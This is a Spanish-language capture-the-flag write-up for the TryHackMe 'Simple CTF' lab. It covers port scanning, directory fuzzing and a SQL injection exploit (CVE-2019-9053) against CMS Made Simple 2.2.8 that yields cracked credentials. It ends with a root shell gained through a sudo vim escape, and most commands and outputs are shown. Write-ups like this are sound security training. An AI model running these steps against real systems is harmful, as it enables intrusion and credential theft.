# Writeup - Simple CTF (TryHackMe)

**Máquina:** Simple CTF  
**Plataforma:** TryHackMe  
**Sistema:** Ubuntu 16.04.6 LTS  
**IP:** 10.128.148.145  
**Objetivo:** Obtener User.txt y Root.txt

---

## 1. Reconocimiento

```bash
ping -c 4 10.128.148.145
```

```
64 bytes from 10.128.148.145: icmp_seq=1 ttl=62 time=21.1 ms
64 bytes from 10.128.148.145: icmp_seq=2 ttl=62 time=19.2 ms
64 bytes from 10.128.148.145: icmp_seq=3 ttl=62 time=19.6 ms
64 bytes from 10.128.148.145: icmp_seq=4 ttl=62 time=19.4 ms
```

Escaneo de puertos:

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.128.148.145 -oG all_ports.txt
```

```
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

Escaneo de servicios:

```bash
nmap -p21,80,2222 -sCV -vvv 10.128.148.145 -oN tcp_scan.txt
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd 3.0.3 (anon login permitido) |
| 80/tcp | HTTP | Apache 2.4.18 (Ubuntu) |
| 2222/tcp | SSH | OpenSSH 7.2p2 Ubuntu |

---

## 2. Enumeración Web

```bash
whatweb http://10.128.148.145/
```

Apache2 Ubuntu Default Page.

Fuzzing de directorios:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt:FUZZ -u "http://10.128.148.145/FUZZ" -c -v -ic -e .php,.txt,.html -recursion
```

Se descubre `/robots.txt` y `/simple` corriendo **CMS Made Simple**.

```bash
curl -s http://10.128.148.145/simple/ | grep version
```

```
CMS Made Simple version 2.2.8
```

---

## 3. Explotación — CVE-2019-9053 (SQL Injection)

```bash
searchsploit 'made it simple 2.2.8'
```

```
CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
```

El exploit de Exploit-DB no funcionó correctamente. Se utilizó una versión funcional desde GitHub:

```bash
python3 exploit.py -u http://10.128.148.145/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: <REDACTED>
```

**Credenciales obtenidas:** `mitch:<REDACTED>`

---

## 4. Acceso SSH

SSH corre en puerto 2222 (no en el 22 estándar):

```bash
ssh mitch@10.128.148.145 -p 2222
```

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
```

Flag de usuario:

```bash
mitch@Machine:~$ cat user.txt
<REDACTED>
```

---

## 5. Escalada de Privilegios

```bash
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

Se abusa de `<REDACTED>` con sudo para ejecutar una shell como root:

```bash
mitch@Machine:~$ sudo vim -c ':!/bin/sh'
```

Dentro del editor se ejecuta `:!/bin/sh` y se obtiene una shell root:

```bash
# whoami
root
# cat /root/root.txt
<REDACTED>
```

---

## 6. Respuestas

| Question | Answer |
|----------|--------|
| How many services are running under port 1000? | `<REDACTED>` |
| What is running on the higher port? | `<REDACTED>` |
| What's the CVE you're using against the application? | `<REDACTED>` |
| To what kind of vulnerability is the application vulnerable? | `<REDACTED>` |
| What's the password? | `<REDACTED>` |
| Where can you login with the details obtained? | `<REDACTED>` |
| What's the user flag? | `<REDACTED>` |
| Is there any other user in the home directory? What's its name? | `<REDACTED>` |
| What can you leverage to spawn a privileged shell? | `<REDACTED>` |
| What's the root flag? | `<REDACTED>` |
